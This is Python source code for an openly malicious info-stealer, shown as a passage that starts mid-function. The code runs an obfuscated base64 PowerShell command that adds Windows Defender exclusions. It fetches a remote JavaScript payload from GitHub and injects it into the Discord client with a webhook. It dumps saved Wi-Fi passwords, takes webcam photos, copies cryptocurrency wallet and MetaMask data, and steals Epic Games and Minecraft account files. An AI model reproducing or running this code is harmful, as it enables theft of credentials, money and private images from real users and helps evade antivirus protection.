        cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXEFwcERhdGEiICYgcG93ZXJzaGVsbC5leGUgLWlucHV0Zm9ybWF0IG5vbmUgLW91dHB1dGZvcm1hdCBub25lIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAlVVNFUlBST0ZJTEUlXExvY2FsIiAmIHBvd2Vyc2hlbGwuZXhlIC1jb21tYW5kICJTZXQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gJy5leGUnLCcucHknIg==').decode(errors="ignore")
        subprocess.run(cmd, shell=True, capture_output=True)

class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        response = requests.get('https://raw.githubusercontent.com/noface1200/noface1200/refs/heads/main/conf/injection.js')
        if response.status_code != 200:
            return
        self.code = response.text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class Wifi:
    def __init__(self):
        self.networks = {}
        self.get_networks()
        self.save_networks()


    def get_networks(self):
        try:
            output_networks = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode(errors='ignore')
            profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]
            
            for profile in profiles:
                if profile:
                    self.networks[profile] = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode(errors='ignore')
        except Exception:
            pass

    def save_networks(self):
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        if self.networks:
            for network, info in self.networks.items():            
                with open(os.path.join(temp_path, "Wifi", f"{network}.txt"), "wb") as f:
                    f.write(info.encode("utf-8"))
        else:
            with open(os.path.join(temp_path, "Wifi", "No Wifi Networks Found.txt"), "w") as f:
                f.write("No wifi networks found.")

def capture_images(num_images=1):
    num_cameras = 0
    cameras = []
    os.makedirs(os.path.join(temp_path, "Webcam"), exist_ok=True)

    while True:
        cap = cv2.VideoCapture(num_cameras)
        if not cap.isOpened():
            break
        cameras.append(cap)
        num_cameras += 1

    if num_cameras == 0:
        return

    for _ in range(num_images):
        for i, cap in enumerate(cameras):
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(os.path.join(temp_path, "Webcam", f"image_from_camera_{i}.jpg"), frame)

    for cap in cameras:
        cap.release()



def steal_wallets():
    wallet_path = os.path.join(temp_path, "Wallets")
    os.makedirs(wallet_path, exist_ok=True)

    wallets = (
        ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
        ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
        ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
        ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
        ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
        ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
        ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
        ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
        ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
    )

    browser_paths = {
        "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
        "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
        "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
        "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
        "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
        "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
        "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
        "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
        "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
        "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
        "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
    }

    for name, path in wallets:
        if os.path.isdir(path):
            named_wallet_path = os.path.join(wallet_path, name)
            os.makedirs(named_wallet_path, exist_ok=True)
            try:
                if path != named_wallet_path:
                    copytree(path, os.path.join(named_wallet_path, os.path.basename(path)), dirs_exist_ok=True)
            except Exception:
                pass

    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == "Local Extension Settings":
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, "Metamask ({})".format(name))
                            named_wallet_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, named_wallet_path, dirs_exist_ok=True)
                                except Exception:
                                    pass
                                else:
                                    if not os.listdir(metamask_browser):
                                        rmtree(metamask_browser)
                                        



class Games:
    def __init__(self):
        self.StealEpic()
        self.StealMinecraft()
        
                        
    def GetLnkFromStartMenu(self, app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
        ]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == "%s.lnk" % app.lower():
                        shortcutPaths.append(os.path.join(root, file))       
        return shortcutPaths
    

    def StealEpic(self) -> None:
        if True:
            saveToPath = os.path.join(temp_path, "Games", "Epic")
            epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, "GameUserSettings.ini")
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        except Exception:
                            pass

    def StealMinecraft(self) -> None:
        saveToPath = os.path.join(temp_path, "Games", "Minecraft")
        userProfile = os.getenv("userprofile")
        roaming = os.getenv("appdata")
        minecraftPaths = {
             "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
             "NEFr" : os.path.join(userProfile, ".NEFrclient", "settings", "game", "accounts.json"),
             "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
             "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
             "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
             "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
             "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
             "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
             "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
             "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
             "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
             "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
             "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
             "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
        }

        for name, path in minecraftPaths.items():
            if os.path.isfile(path):
                try:
                    os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                except Exception:
                    continue

NEF(webhook)
